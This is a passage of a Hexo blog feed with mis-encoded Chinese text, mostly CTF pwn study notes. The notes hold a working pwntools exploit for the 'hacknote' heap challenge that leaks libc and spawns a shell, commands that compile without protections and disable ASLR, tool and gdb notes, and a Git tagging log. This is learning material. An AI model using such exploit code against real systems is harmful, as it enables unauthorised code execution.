class="hljs-number">24</span>+p64(shellcode_addr))<br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>p=process(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc_32.so.6&quot;</span>)<br>read_got = elf.got[<span class="hljs-string">&quot;read&quot;</span>]<br>pfputs = <span class="hljs-number">0x804862b</span><br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_note</span>(<span class="hljs-params">size,index</span>):</span><br>      p.recvuntil(<span class="hljs-string">b&quot;choice :&quot;</span>)<br>      p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>      p.recvuntil(<span class="hljs-string">b&quot;size :&quot;</span>)<br>      p.sendline(size)<br>      p.recvuntil(<span class="hljs-string">b&quot;Content :&quot;</span>)<br>      p.sendline(index)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_note</span>(<span class="hljs-params">index</span>):</span><br>      p.recvuntil(<span class="hljs-string">b&quot;choice :&quot;</span>)<br>      p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>      p.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>      p.sendline(index)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_note</span>(<span class="hljs-params">index</span>):</span><br>      p.recvuntil(<span class="hljs-string">b&quot;choice :&quot;</span>)<br>      p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>      p.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>      p.sendline(index)<br><br>add_note(<span class="hljs-string">b&quot;16&quot;</span>,<span class="hljs-string">b&quot;aaaaa&quot;</span>)<br>add_note(<span class="hljs-string">b&quot;16&quot;</span>,<span class="hljs-string">b&quot;aaaaa&quot;</span>)<br>delete_note(<span class="hljs-string">b&#x27;0&#x27;</span>)<br>delete_note(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>add_note(<span class="hljs-string">b&#x27;8&#x27;</span>,p32(pfputs)+p32(read_got))<br>print_note(<span class="hljs-string">b&#x27;0&#x27;</span>)<br>pfread = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>pfsys = pfread - <span class="hljs-number">0xd41c0</span> + <span class="hljs-number">0x3a940</span><br><br>delete_note(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>add_note(<span class="hljs-string">b&#x27;8&#x27;</span>,p32(pfsys)+<span class="hljs-string">b&quot;||sh&quot;</span>)<br>print_note(<span class="hljs-string">b&#x27;0&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="PartEx1-å†…å­˜ä¿æŠ¤æªæ–½"><a href="#PartEx1-å†…å­˜ä¿æŠ¤æªæ–½" class="headerlink" title="PartEx1 å†…å­˜ä¿æŠ¤æªæ–½"></a>PartEx1 å†…å­˜ä¿æŠ¤æªæ–½</h2><p><strong>compile.shï¼š</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-comment"># Canaryã€æ ˆå¯æ‰§è¡Œã€PIE</span><br>gcc -fno-stack-protector -z execstack -no-pie -g -o ret2stack ret2stack.c<br></code></pre></td></tr></table></figure><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><blockquote><p>ASLR (Address Space Layout Randomization)</p></blockquote><ul><li><p>ç³»ç»Ÿçš„é˜²æŠ¤æªæ–½ï¼Œç¨‹åºè£…è½½æ—¶ç”Ÿæ•ˆ</p><ul><li>/proc/sys/kernel/randomize_va_space = 0ï¼šæ²¡æœ‰éšæœºåŒ–ã€‚å³å…³é—­ ASLR</li><li>/proc/sys/kernel/randomize_va_space = 1ï¼šä¿ç•™çš„éšæœºåŒ–ã€‚å…±äº«åº“ã€æ ˆã€mmap() ä»¥åŠ VDSO å°†è¢«éšæœºåŒ–</li><li>/proc/sys/kernel/randomize_va_space = 2ï¼šå®Œå…¨çš„éšæœºåŒ–ã€‚åœ¨randomize_va_space = 1çš„åŸºç¡€ä¸Šï¼Œé€šè¿‡ brk() åˆ†é…çš„å†…å­˜ç©ºé—´ä¹Ÿå°†è¢«éšæœºåŒ–</li></ul></li><li><p>```shell<br>$ su<br>$ echo 0 &gt; /proc/sys/kernel/randomize_va_space<br>$ cat /proc/sys/kernel/randomize_va_space</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs haml"><br><br><br>### PIE<br><br>&gt; PIE (Position-Independent Executable)<br><br>-<span class="ruby"> ç¨‹åºçš„é˜²æŠ¤æªæ–½ï¼Œç¼–è¯‘æ—¶ç”Ÿæ•ˆ</span><br><span class="ruby"></span><br>-<span class="ruby"> éšæœºåŒ–ELFæ–‡ä»¶çš„æ˜ å°„åœ°å€</span><br><span class="ruby"></span><br>-<span class="ruby"> å¼€å¯ ASLR ä¹‹åï¼ŒPIE æ‰ä¼šç”Ÿæ•ˆ</span><br><span class="ruby"></span><br><br><br>### The NX bits<br><br>&gt; The NX bits (the No-eXecute bits)<br><br>-<span class="ruby"> ç¨‹åºä¸æ“ä½œç³»ç»Ÿçš„é˜²æŠ¤æªæ–½ï¼Œç¼–è¯‘æ—¶å†³å®šæ˜¯å¦ç”Ÿæ•ˆï¼Œç”±æ“ä½œç³»ç»Ÿå®ç°</span><br><span class="ruby"></span><br>-<span class="ruby"> é€šè¿‡åœ¨å†…å­˜é¡µçš„æ ‡è¯†ä¸­å¢åŠ â€œæ‰§è¡Œâ€ä½, å¯ä»¥è¡¨ç¤ºè¯¥å†…å­˜é¡µæ˜¯å¦å¯ä»¥æ‰§è¡Œ, è‹¥ç¨‹åºä»£ç çš„ EIP æ‰§è¡Œè‡³ä¸å¯è¿è¡Œçš„å†…å­˜é¡µ, åˆ™ CPU å°†ç›´æ¥æ‹’ç»æ‰§è¡Œâ€œæŒ‡ä»¤â€é€ æˆç¨‹åºå´©æºƒ</span><br><span class="ruby"></span><br>&lt;img src=&quot;Pwn/537371648ede66c371eb4d76cd2ffd9b.png&quot; alt=&quot;image-20220410140915940&quot; style=&quot;zoom: 67%;&quot; /&gt;<br><br><br><br>### Canary<br><br>-<span class="ruby"> ç¨‹åºçš„é˜²æŠ¤æªæ–½ï¼Œç¼–è¯‘æ—¶ç”Ÿæ•ˆ</span><br><span class="ruby"></span><br>-<span class="ruby"> åœ¨åˆšè¿›å…¥å‡½æ•°æ—¶ï¼Œåœ¨æ ˆä¸Šæ”¾ç½®ä¸€ä¸ªæ ‡å¿—canaryï¼Œåœ¨å‡½æ•°è¿”å›æ—¶æ£€æµ‹å…¶æ˜¯å¦è¢«æ”¹å˜ã€‚ä»¥è¾¾åˆ°é˜²æŠ¤æ ˆæº¢å‡ºçš„ç›®çš„</span><br><span class="ruby"></span><br>-<span class="ruby"> canaryé•¿åº¦ä¸º<span class="hljs-number">1</span>å­—é•¿ï¼Œå…¶ä½ç½®ä¸ä¸€å®šä¸ebp/rbpå­˜å‚¨çš„ä½ç½®ç›¸é‚»ï¼Œå…·ä½“å¾—çœ‹ç¨‹åºçš„æ±‡ç¼–æ“ä½œ</span><br><span class="ruby"></span><br><br><br>### RELRO<br><br>&gt; RELRO (RELocate Read-Only)<br><br>-<span class="ruby"> ç¨‹åºçš„é˜²æŠ¤æªæ–½ï¼Œç¼–è¯‘æ—¶ç”Ÿæ•ˆ</span><br><span class="ruby"></span><br>-<span class="ruby"> éƒ¨åˆ† <span class="hljs-symbol">RELRO:</span> åœ¨ç¨‹åºè£…å…¥å, å°†å…¶ä¸­ä¸€äº›æ®µ(å¦‚.dynamic)æ ‡è®°ä¸ºåªè¯», é˜²æ­¢ç¨‹åºçš„ä¸€äº›é‡å®šä½ä¿¡æ¯è¢«ä¿®æ”¹</span><br><span class="ruby"></span><br>-<span class="ruby"> å®Œå…¨ <span class="hljs-symbol">RELRO:</span> åœ¨éƒ¨åˆ† RELRO çš„åŸºç¡€ä¸Š, åœ¨ç¨‹åºè£…å…¥æ—¶, ç›´æ¥è§£æå®Œæ‰€æœ‰ç¬¦å·å¹¶å¡«å…¥å¯¹åº”çš„å€¼, æ­¤æ—¶æ‰€æœ‰çš„ GOT è¡¨é¡¹éƒ½å·²åˆå§‹åŒ–, ä¸”ä¸è£…å…¥link_mapä¸_dl_runtime_resolveçš„åœ°å€</span><br><span class="ruby"></span><br><br><br>## PartEx2 PWN Tools<br><br>-<span class="ruby"> IDA Pro</span><br><span class="ruby"></span><br>-<span class="ruby"> pwntools</span><br><span class="ruby"></span>-<span class="ruby"> pwndbg</span><br><span class="ruby"></span>-<span class="ruby"> checksec</span><br><span class="ruby"></span>-<span class="ruby"> ROPgadget</span><br><span class="ruby"></span>-<span class="ruby"> one_gadget</span><br><span class="ruby"></span>-<span class="ruby"> LibcSearcher</span><br><span class="ruby"></span>-<span class="ruby"> main_arena_offset</span><br><span class="ruby"></span><br><br><br>### Pwn tools<br><br>-<span class="ruby"> VMware</span><br><span class="ruby"></span>  -<span class="ruby"> deepin</span><br><span class="ruby"></span>  -<span class="ruby"> Ubuntu</span><br><span class="ruby"></span>  -<span class="ruby"> kali</span><br><span class="ruby"></span>-<span class="ruby"> WSL</span><br><span class="ruby"></span>-<span class="ruby"> shell</span><br><span class="ruby"></span>  -<span class="ruby"> zsh</span><br><span class="ruby"></span>-<span class="ruby"> vim</span><br><span class="ruby"></span>  -<span class="ruby"> %!xxd</span><br><span class="ruby"></span>  -<span class="ruby"> %!xxd -r</span><br><span class="ruby"></span>-<span class="ruby"> python</span><br><span class="ruby"></span>-<span class="ruby"> gdb</span><br><span class="ruby"></span>  -<span class="ruby"> pwndbg</span><br><span class="ruby"></span><br><br><br>-<span class="ruby"> IDA Pro</span><br><span class="ruby"></span>  -<span class="ruby"> åæ±‡ç¼–ï¼Œé™æ€åˆ†æ</span><br><span class="ruby"></span>  -<span class="ruby"> F5ï¼šåç¼–è¯‘ï¼ˆCè¯­è¨€ï¼‰</span><br><span class="ruby"></span>  -<span class="ruby"> Shift + F12 ï¼šæŸ¥æ‰¾å­—ç¬¦ä¸²</span><br><span class="ruby"></span>  -<span class="ruby"> Gï¼šåœ°å€è°ƒè½¬</span><br><span class="ruby"></span>  -<span class="ruby"> ç©ºæ ¼é”®ï¼šè¿›å…¥æ±‡ç¼–ä»£ç è§†å›¾</span><br><span class="ruby"></span>  -<span class="ruby"> nï¼šæ›´æ”¹å˜é‡çš„åç§°</span><br><span class="ruby"></span>  -<span class="ruby"> /ï¼šæ³¨é‡Š</span><br><span class="ruby"></span>  -<span class="ruby"> Rï¼š</span><br><span class="ruby"></span>-<span class="ruby"> pwntools</span><br><span class="ruby"></span>  -<span class="ruby"> pythonæ¨¡å—</span><br><span class="ruby"></span>  -<span class="ruby"> pip install pwntools</span><br><span class="ruby"></span>  -<span class="ruby"> from pwn import *</span><br><span class="ruby"></span>  -<span class="ruby"> LibSearcherï¼Œä¾é™„äºpython2</span><br><span class="ruby"></span>  -<span class="ruby"> pip --proxy ï¼Œä½¿ç”¨ä»£ç†</span><br><span class="ruby"></span><br><br><br>```python<br>from pwn import *<br><br>io = process(&quot;./test&quot;)<br>io = remote(&quot;106.54.129.202&quot;,10002)<br><br>io.recvline()<br>io.recv()<br><br># å­—èŠ‚æµ<br>io.send(b&quot;abcdefg&quot;)<br>io.send(p64(1))<br>io.send(p32(1))<br>io.send(p32(1) + b&quot;abcdefg&quot;)<br>io.send(p32(1) + b&quot;\x0a&quot;)  # 0x0aã€10ã€\n<br>io.sendline(b&quot;abcdefg&quot;)<br>io.send(b&quot;abcdefg\n&quot;)<br><br># æ‰“åŒ…ã€è§£åŒ…<br>p32(1234)<br>u32(b&#x27;\xc06&#x27;)<br><br># è½¬åŒ–<br>hex(ord(&#x27;#&#x27;))  # 0x23<br>chr(0x23)      # #<br></code></pre></td></tr></table></figure></li></ul><ul><li>pwndbg<ul><li>gdbæ’ä»¶ï¼Œç”¨äºåŠ¨æ€è°ƒè¯•</li><li>æ ˆä½¿ç”¨æƒ…å†µ</li><li>pedaã€gefã€pwndbg</li><li>ä½¿ç”¨ï¼šgdb a.out</li></ul></li></ul><p>ç”¨ gdb æŸ¥çœ‹å†…å­˜ï¼š</p><blockquote><p>å¯ä»¥ä½¿ç”¨ examine å‘½ä»¤ï¼ˆç®€å†™æ˜¯ x ï¼‰æ¥æŸ¥çœ‹å†…å­˜åœ°å€ä¸­çš„å€¼ã€‚</p><p>æ ¼å¼ï¼šx/<nfu> <addr></addr></nfu></p></blockquote><ul><li>è¯´æ˜ï¼šx æ˜¯ examine çš„ç¼©å†™ï¼Œnã€fã€uæ˜¯å¯é€‰çš„å‚æ•°</li><li>n æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ï¼Œè¡¨ç¤ºéœ€è¦æ˜¾ç¤ºçš„å†…å­˜å•å…ƒçš„ä¸ªæ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ä»å½“å‰åœ°å€å‘åæ˜¾ç¤ºå‡ ä¸ªå†…å­˜å•å…ƒçš„å†…å®¹<ul><li>ä¸€ä¸ªå†…å­˜å•å…ƒçš„å¤§å°ç”±åé¢çš„ u å®šä¹‰ã€‚</li></ul></li><li>f è¡¨ç¤ºæ˜¾ç¤ºçš„æ ¼å¼ï¼Œå‚è§ä¸‹é¢ã€‚å¦‚æœåœ°å€æ‰€æŒ‡çš„æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæ ¼å¼å¯ä»¥æ˜¯ sï¼Œå¦‚æœåœ°å€æ˜¯æŒ‡ä»¤åœ°å€ï¼Œé‚£ä¹ˆæ ¼å¼å¯ä»¥æ˜¯ iã€‚<ul><li>x æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚ </li><li>d æŒ‰åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚ </li><li>u æŒ‰åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºæ— ç¬¦å·æ•´å‹ã€‚ </li><li>o æŒ‰å…«è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</li><li>t æŒ‰äºŒè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚ </li><li>a æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚ </li><li>i æŒ‡ä»¤åœ°å€æ ¼å¼ </li><li>c æŒ‰å­—ç¬¦æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚ </li><li>f æŒ‰æµ®ç‚¹æ•°æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</li></ul></li><li>uè¡¨ç¤ºä¸€ä¸ªåœ°å€å•å…ƒçš„é•¿åº¦ <ul><li>u è¡¨ç¤ºä»å½“å‰åœ°å€å¾€åè¯·æ±‚çš„å­—èŠ‚æ•°ï¼Œå¦‚æœä¸æŒ‡å®šçš„è¯ï¼ŒGDBé»˜è®¤æ˜¯4ä¸ªbytesã€‚</li><li>å½“æˆ‘ä»¬æŒ‡å®šäº†å­—èŠ‚é•¿åº¦åï¼ŒGDBä¼šä»æŒ‡å†…å­˜æŒ‡å®šçš„å†…å­˜åœ°å€å¼€å§‹ï¼Œè¯»å†™æŒ‡å®šå­—èŠ‚ï¼Œå¹¶æŠŠå…¶å½“ä½œä¸€ä¸ªå€¼å–å‡ºæ¥ã€‚</li><li>bè¡¨ç¤ºå•å­—èŠ‚ï¼Œ hè¡¨ç¤ºåŒå­—èŠ‚ï¼Œ wè¡¨ç¤ºå››å­—èŠ‚ï¼Œ gè¡¨ç¤ºå…«å­—èŠ‚</li></ul></li><li><addr> è¡¨ç¤ºä¸€ä¸ªå†…å­˜åœ°å€ã€‚</addr></li><li>æ³¨æ„ï¼šä¸¥æ ¼åŒºåˆ†nå’Œuçš„å…³ç³»ï¼Œnè¡¨ç¤ºå•å…ƒä¸ªæ•°ï¼Œuè¡¨ç¤ºæ¯ä¸ªå•å…ƒçš„å¤§å°ã€‚</li></ul><p>å‘½ä»¤ï¼šx/3uh 0x54320<br>å«ä¹‰ï¼šä»å†…å­˜åœ°å€0x54320è¯»å–å†…å®¹ï¼Œhè¡¨ç¤ºä»¥åŒå­—èŠ‚ä¸ºä¸€ä¸ªå•ä½ï¼Œ3è¡¨ç¤ºè¾“å‡ºä¸‰ä¸ªå•ä½ï¼Œuè¡¨ç¤ºæŒ‰æ— ç¬¦å·åè¿›åˆ¶æ˜¾ç¤ºã€‚</p><ul><li>checksec<ul><li>éšpwntoolså®‰è£…çš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·</li><li>æŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶ä¿æŠ¤æªæ–½çš„ä¿¡æ¯</li><li>ä½¿ç”¨ï¼šchecksec a.out</li></ul></li><li>ROPgadget</li><li>one_gadget</li><li>LibcSearcher</li><li>main_arena_offset</li></ul><h3 id="LinuxåŸºç¡€"><a href="#LinuxåŸºç¡€" class="headerlink" title="LinuxåŸºç¡€"></a>LinuxåŸºç¡€</h3><ul><li>Teminal<ul><li>ç»ˆç«¯</li><li>å¯ä»¥è¿è¡Œå¤šä¸ªshell</li></ul></li><li>shell<ul><li>ç”¨æˆ·ä¸æ“ä½œç³»ç»Ÿäº¤äº’çš„æ¥å£ï¼ˆGUIå›¾å½¢ç”¨æˆ·æ¥å£/ç•Œé¢ï¼‰</li><li>zshã€shã€bash</li></ul></li><li><p>Linuxå¿«æ·é”®</p><ul><li>Ctrl + Dï¼šexitï¼ˆé€€å‡ºï¼‰</li><li>Ctrl + Cï¼šä¸­æ–­/ç»ˆæ­¢</li><li>Ctrl + Alt</li><li>Ctrl + -/+</li><li>Ctrl + Shift + C/V</li></ul></li><li><p>Linuxå‘½ä»¤</p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ file <span class="hljs-built_in">test</span><span class="hljs-comment"># è¯†åˆ«æ–‡ä»¶ç±»å‹</span><br><br><span class="hljs-comment"># è¿è¡Œæ–‡ä»¶</span><br>$ ./<span class="hljs-built_in">test</span><br>$ python exp.py<br><br><span class="hljs-comment"># æŒ‡å®šè§£é‡Šå™¨: #!/bin/python3</span><br>$ chmod +x exp.py<br>$ sudo ./exp.py<br><br>$ nc 196.128.0.1 10001<span class="hljs-comment"># è¿è¡Œè¿œç¨‹æ–‡ä»¶</span><br><br>$ man 3 gets<span class="hljs-comment"># å¯ä»¥é€šè¿‡ä¸€äº›å‚æ•°ï¼Œå¿«é€ŸæŸ¥è¯¢linuxå¸®åŠ©æ‰‹å†Œï¼Œå¹¶ä¸”æ ¼å¼åŒ–æ˜¾ç¤ºã€‚</span><br><br>$ <span class="hljs-built_in">echo</span> &lt;base64&gt; | base64 -d<br><br><span class="hljs-comment"># åœ¨å¯¹è±¡æ–‡ä»¶æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æŸ¥æ‰¾å¯æ‰“å°çš„å­—ç¬¦ä¸²</span><br>$ strings phone_book<br>$ strings phone_book | grep fleg<br></code></pre></td></tr></table></figure><h2 id="PartEx3-ç½‘ç«™"><a href="#PartEx3-ç½‘ç«™" class="headerlink" title="PartEx3 ç½‘ç«™"></a>PartEx3 ç½‘ç«™</h2><p><a href="https://www.yuque.com/hxfqg9">yichençš„ä¿¡å®‰çŸ¥è¯†åº“ Â· è¯­é›€ (yuque.com)</a></p><p><strong>Shellcodeï¼š</strong></p><p><a href="http://shell-storm.org/">shell-storm | Home</a></p><p><strong>Format String Tools and Ref</strong></p><ul><li><p><a href="https://github.com/hellman/libformatstr">https://github.com/hellman/libformatstr</a></p></li><li><p><a href="https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf">https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf</a></p></li><li><p><a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf">http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf</a></p></li></ul><p><strong>Heap:</strong></p><ul><li><p><a href="https://heap-exploitation.dhavalkapil.com/">Preface - heap-exploitation (dhavalkapil.com)</a></p></li><li><p><a href="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a></p></li><li><p>www.slideshare.net/AngelBoy1?utm_campaign=profiletracking&amp;utm_medium=sssite&amp;utm_source=ssslideview</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gitæ‰“æ ‡ç­¾</title>
    <link href="/2021/12/01/Tools/Git/Git%E6%89%93%E6%A0%87%E7%AD%BE/"/>
    <url>/2021/12/01/Tools/Git/Git%E6%89%93%E6%A0%87%E7%AD%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="Git-æ‰“æ ‡ç­¾"><a href="#Git-æ‰“æ ‡ç­¾" class="headerlink" title="Git æ‰“æ ‡ç­¾"></a>Git æ‰“æ ‡ç­¾</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">13562@DESKTOP-8HHTU8A MINGW64 /d/GitHub_Gitee/secretsender (master)<br>$ git status<br>On branch master<br>Your branch is up to date with <span class="hljs-string">&#x27;origin/master&#x27;</span>.<br><br>Changes not staged <span class="hljs-keyword">for</span> commit:<br>  (use <span class="hljs-string">&quot;git add &lt;file&gt;...&quot;</span> to update what will be committed)<br>  (use <span class="hljs-string">&quot;git restore &lt;file&gt;...&quot;</span> to discard changes <span class="hljs-keyword">in</span> working directory)<br>        modified:   secretsender.c<br>        modified:   secretsender.exe<br><br>no changes added to commit (use <span class="hljs-string">&quot;git add&quot;</span> and/or <span class="hljs-string">&quot;git commit -a&quot;</span>)<br><br>13562@DESKTOP-8HHTU8A MINGW64 /d/GitHub_Gitee/secretsender (master)<br>$ git add -A<br><br>13562@DESKTOP-8HHTU8A MINGW64 /d/GitHub_Gitee/secretsender (master)<br>$ git commit -m <span class="hljs-string">&quot;æ¡†æ¶ä¼˜åŒ– and ç¼“å†²åŒºæº¢å‡ºå¤„ç†&quot;</span><br>[master caf356b] æ¡†æ¶ä¼˜åŒ– and ç¼“å†²åŒºæº¢å‡ºå¤„ç†<br> 2 files changed, 310 insertions(+), 209 deletions(-)<br><br>13562@DESKTOP-8HHTU8A MINGW64 /d/GitHub_Gitee/secretsender (master)<br>$ git tag v2.0<br><br>13562@DESKTOP-8HHTU8A MINGW64 /d/GitHub_Gitee/secretsender (master)<br>$ git push origin master<br>Enumerating objects: 7, <span class="hljs-keyword">done</span>.<br>Counting objects: 100% (7/7), <span class="hljs-keyword">done</span>.<br>Delta compression using up to 8 threads<br>Compressing objects: 100% (4/4), <span class="hljs-keyword">done</span>.<br>Writing objects: 100% (4/4), 10.76 KiB | 1.79 MiB/s, <span class="hljs-keyword">done</span>.<br>Total 4 (delta 3), reused 0 (delta 0), pack-reused 0<br>remote: Powered by GITEE.COM [GNK-6.2]<br>To gitee.com:wang-zhenzhao/secretsender.git<br>   41e0f17..caf356b  master -&gt; master<br><br>13562@DESKTOP-8HHTU8A MINGW64 /d/GitHub_Gitee/secretsender (master)<br>$ git tag<br>v1.0<br>v2.0<br><br>13562@DESKTOP-8HHTU8A MINGW64 /d/GitHub_Gitee/secretsender (master)<br>$ git push origin v2.0<br>Total 0 (delta 0), reused 0 (delta 0), pack-reused 0<br>remote: Powered by GITEE.COM [GNK-6.2]<br>To gitee.com:wang-zhenzhao/secretsender.git<br> * [new tag]         v2.0 -&gt; v2.0<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>git</tag>
      
      <tag>æ ‡ç­¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kaliå®‰è£…jre</title>
    <link href="/2021/11/29/Linux/Kali/kali%E5%AE%89%E8%A3%85jre/"/>
    <url>/2021/11/29/Linux/Kali/kali%E5%AE%89%E8%A3%85jre/</url>
    
